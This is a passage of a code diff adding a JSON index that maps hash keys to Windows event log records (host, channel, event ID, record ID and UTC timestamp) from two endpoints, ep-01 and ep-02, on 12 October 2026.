+      "time_utc": "2026-10-12T09:17:54.571170Z"
+    },
+    "4ccf5f3c6d0cde2c23b0b9e918b44afff11c6ac68d47c18974c6a7100805ff03": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5140,
+      "record_id": 1732831,
+      "time_utc": "2026-10-12T09:17:57.757629Z"
+    },
+    "4d2f7a8dd43efef58e7fcb0d301225f8ca2000405842407a0ce80f3e58603c19": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 64085,
+      "time_utc": "2026-10-12T09:19:33.529000Z"
+    },
+    "4fcf4ea63306ac26b2bb4f82b72f536b30ff77c0a117d8cdac7f1ad2751357c0": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2346933,
+      "time_utc": "2026-10-12T09:19:33.529350Z"
+    },
+    "52f0246c6ff33816efa4992b9c5684eb8468389ad7177501075ef4ad36ed5c9a": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1732837,
+      "time_utc": "2026-10-12T09:17:57.960867Z"
+    },
+    "537c2df82be2d4c1cb5a665d6be823b9fcf58304f30f3aa51ef4d39f18a04c23": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 64081,
+      "time_utc": "2026-10-12T09:19:30.841000Z"
+    },
+    "5634d6f544f32d734c219f66425284dd9af3c7116021e06e1326a166e9866f50": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 63981,
+      "time_utc": "2026-10-12T09:17:54.571000Z"
+    },
+    "5fbcdb4d9097752a82a8b5b69c9388da7203bfc12288aa42e8e3e4fc33ef4cc0": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 63978,
+      "time_utc": "2026-10-12T09:17:54.024000Z"
+    },
+    "669862110cb04514c892dcb4d7a59844902019cd13b51d513a1dae62982cd328": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 63342,
+      "time_utc": "2026-10-12T09:10:48.635000Z"
+    },
+    "69e92dfbc001e1900d8415b46d589c78292bb489d6e38df3a2c5ff055b251010": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1732836,
+      "time_utc": "2026-10-12T09:17:57.956733Z"
+    },
+    "6f60f8e334fdc3a9310f6e6a61bcda17401c00831423bedd467114170e0d54bd": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4624,
+      "record_id": 1733139,
+      "time_utc": "2026-10-12T09:19:33.179614Z"
+    },
+    "6f7f81dfe0d997a394c48f1e17324dc97c97dba1bf7e65ffd6d5170f727d41e2": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1733131,
+      "time_utc": "2026-10-12T09:19:33.047069Z"
+    },
+    "71bad54bf8b83402d247001dddc1e14b3b5337d5a5a16e85818360bcb8765913": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1711896,
+      "time_utc": "2026-10-12T09:11:08.110980Z"
+    },
+    "72a62ab20a8c20dfe39ebf9c3dd6a3e3b262f83551bb8d8ed1eeb0066896e765": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4624,
+      "record_id": 1732829,
+      "time_utc": "2026-10-12T09:17:57.753472Z"
+    },
+    "792a368261207cf9ec5eea670007666830988680159c3dee2884d51e8cc6be07": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1733133,
+      "time_utc": "2026-10-12T09:19:33.062842Z"
+    },
+    "7abfb57216fad526121fe35ed3333d90726e2dbfb9e6306876756e8b830b1389": {
+      "host": "ep-02",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 49485,
+      "time_utc": "2026-10-12T07:06:29.674000Z"
+    },
+    "8177dd10788b86407f46a7da283fc81097dea5a73b3a120536edff007df472a7": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1732838,
+      "time_utc": "2026-10-12T09:17:57.960873Z"
+    },
+    "8335779b7f841bfac8b4079798ca4ee4ba6794baaee3e0f6eb629cdf27b7e267": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1711897,
+      "time_utc": "2026-10-12T09:11:08.118378Z"
+    },
+    "8351c7f300da9b8feefe2d73bacd73ff1f1c5f91213f3e7390fbc61588e33e72": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4624,
+      "record_id": 1732842,
+      "time_utc": "2026-10-12T09:17:58.075181Z"
+    },
+    "8824b80b39973ccb9b9e2a5d66db8c69ed00f3436a36675eb67aaa7b79c35140": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 10,
+      "record_id": 63947,
+      "time_utc": "2026-10-12T09:17:06.238000Z"
+    },
+    "8b4a334a93862af93aad2b2b3593bacdcaf3866e1f993b638736d008a3064273": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 1705666,
+      "time_utc": "2026-10-12T07:06:28.532904Z"
+    },
+    "9744ca66d21357a641c044debfc6e53cf11fda33b51fd789de35677b5f09c31e": {
+      "host": "ep-02",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 49561,
+      "time_utc": "2026-10-12T07:08:03.694000Z"
+    },
+    "99d22a45da0f7135ef85e10c51436b58705f7e6d47ebdd2f7a60dec9b2f5b858": {
+      "host": "ep-02",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 49548,
+      "time_utc": "2026-10-12T07:07:40.382000Z"
+    },
+    "9be7637247fb27f5bae6a6c4e6a6182c1daadfb2cd67d3a7c84f098c9839a492": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1733134,
+      "time_utc": "2026-10-12T09:19:33.062852Z"
+    },
+    "a097f905c8997dd0a2106586b3d12de4d2fdace17232823ce3cc7fd0cd1c5d15": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 63343,
+      "time_utc": "2026-10-12T09:10:48.643000Z"
+    },
+    "a10ebdbbb0ec42222a1d04c872f0f8ebdc2643fe089217b51e61fdcfe7302888": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2346875,
+      "time_utc": "2026-10-12T09:19:30.841660Z"
+    },
+    "a1b67934908137b84807545a7ba1ff2ffc4fb4d0fefd151a901d697435765e47": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4624,
+      "record_id": 2339360,
+      "time_utc": "2026-10-12T09:10:39.911334Z"
+    },
+    "a3db11e72fb0297b63454f9d33e5093214c13903a088e545ff7a6932f2080c74": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2339387,
+      "time_utc": "2026-10-12T09:10:40.254135Z"
+    },
+    "a765fe8d86bd60e989c3b7d0dcb1378d8ef7e82efca898e17ac5fc24d900182f": {
+      "host": "ep-02",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 49473,
+      "time_utc": "2026-10-12T07:06:28.532000Z"
+    },
+    "a82e79c4f31aa8a0f4b64e54c5b8f3c85d1a5631e2d6fdfb6c78e4e7e0d71d01": {
+      "host": "ep-02",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 49113,
+      "time_utc": "2026-10-12T07:03:46.685000Z"
+    },
+    "a86ea93dbf47a74eb4bacaccf46143cf9c69dff09ebcf4c86b713578eef71573": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1733132,
+      "time_utc": "2026-10-12T09:19:33.057307Z"
+    },
+    "b14873e8ac54c288fe149af42c97a8a581b734f98ad9f194182d7ae861c6f529": {
+      "host": "ep-02",
+      "channel": "System",
+      "event_id": 7045,
+      "record_id": 6082,
+      "time_utc": "2026-10-12T09:17:58.082630Z"
+    },
+    "b9f82b991aeeb9267e48a10c5d0aa699ac25aa725a4e860a3d5ddcbf45fefe5e": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5140,
+      "record_id": 1711894,
+      "time_utc": "2026-10-12T09:11:08.101705Z"
+    },
+    "bd91e94d7b36998a4251d906a946b41e6dee8a8f4380f2af3a224841ddcad8a4": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1732835,
+      "time_utc": "2026-10-12T09:17:57.948166Z"
+    },
+    "c2b6170035f837c5938893232da8f85e7360cc9cad582db0f610a11efabf1964": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 63257,
+      "time_utc": "2026-10-12T09:10:40.254000Z"
+    },
+    "cc3d5b77a98438b68c90fbf2d07cdbf94c8f18191def049e2235e4ae32fefc66": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4624,
+      "record_id": 1733146,
+      "time_utc": "2026-10-12T09:19:33.228646Z"
+    },
+    "cd30b87289c50fc1c2b172ca5c285bfd77c0eb663b03d3ceca774f2f385ff712": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 63851,
+      "time_utc": "2026-10-12T09:15:04.757000Z"
+    },
+    "cee44f90297214bedbc83dc1cd9d91f70997aceb3079b338972745fbc641319f": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4697,
+      "record_id": 1733141,
+      "time_utc": "2026-10-12T09:19:33.183268Z"
+    },
+    "d6f5d144ec2e8f1546eae8ee746fab7b12eee965a5071d69518f5a8c7397fec7": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2339389,
+      "time_utc": "2026-10-12T09:10:40.260797Z"
+    },
+    "d7443dcf157ce78d4decb59d2e7e861ad5dd5efd8fc31103a549c6735ec45b0d": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 63982,
+      "time_utc": "2026-10-12T09:17:54.642000Z"
+    },
+    "d895032737335ae3700f84c3b5f087f05daa440f9b4739a6f8744730f764bc0c": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2345545,
+      "time_utc": "2026-10-12T09:17:54.024239Z"
+    },
+    "da788b98644edb6ab2836b9e3cb96dc7720a2b26ac7ae9e09c57aff1f114e1cc": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2339391,
+      "time_utc": "2026-10-12T09:10:40.290157Z"
+    },
+    "e8e58bf88010017870f12d54ed793860e82e076378e8fe665ae1fe549bc3a09a": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 1,
+      "record_id": 63256,
+      "time_utc": "2026-10-12T09:10:40.290000Z"
+    },
+    "ecaa652a6ee942f157728bc45bb3f1c04c400977c6b5b14b318ca0f023166bb8": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5145,
+      "record_id": 1733129,
+      "time_utc": "2026-10-12T09:19:33.035004Z"
+    },
+    "ee86c364dd317ca6fcfa7ba8bdebccc77a65f914cd57b3d3abcc4ae40362488e": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 4624,
+      "record_id": 1732849,
+      "time_utc": "2026-10-12T09:17:58.129569Z"
+    },
+    "f395acd0d86b99ff549a67886d3ccf0b21ec4f78c24fab241669974e02dcf988": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5140,
+      "record_id": 1733128,
+      "time_utc": "2026-10-12T09:19:33.030240Z"
+    },
+    "f6b7371deb45bc8e0c9e246c75b1d715e4aadd73c7a840eef90d8d7e8293ef1e": {
+      "host": "ep-01",
+      "channel": "Security",
+      "event_id": 4688,
+      "record_id": 2346929,
+      "time_utc": "2026-10-12T09:19:33.472797Z"
+    },
+    "f98e0c8500873d3e2f76fe2af4d51441a6a3588ea613e3112c7bb4f1b34c9026": {
+      "host": "ep-01",
+      "channel": "Sysmon",
+      "event_id": 3,
+      "record_id": 63806,
+      "time_utc": "2026-10-12T09:14:50.777000Z"
+    },
+    "fcdd4d6a2ad462c9affc83389955054fae29434864d3455cea617c9c0b24fe22": {
+      "host": "ep-02",
+      "channel": "Security",
+      "event_id": 5140,
+      "record_id": 1732832,
+      "time_utc": "2026-10-12T09:17:57.936696Z"
+    }
+  }
+}
